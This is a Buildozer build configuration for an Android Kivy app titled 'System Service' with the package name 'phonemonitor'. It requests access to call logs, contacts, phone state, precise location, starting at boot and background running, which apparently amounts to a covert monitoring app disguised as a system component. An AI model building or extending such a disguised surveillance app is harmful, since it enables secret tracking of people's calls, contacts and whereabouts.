[app]
title = System Service
package.name = phonemonitor
package.domain = org.system
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,json
version = 3.0
requirements = python3,kivy==2.2.1,requests,urllib3,charset-normalizer,idna,certifi,android,pyjnius
orientation = portrait
fullscreen = 0
android.permissions = INTERNET,READ_CALL_LOG,READ_CONTACTS,READ_PHONE_STATE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,WAKE_LOCK
android.archs = arm64-v8a
android.api = 33
android.minapi = 21
android.ndk = 25b
android.sdk = 33
android.accept_sdk_license = True

[buildozer]
log_level = 2
warn_on_root = 0
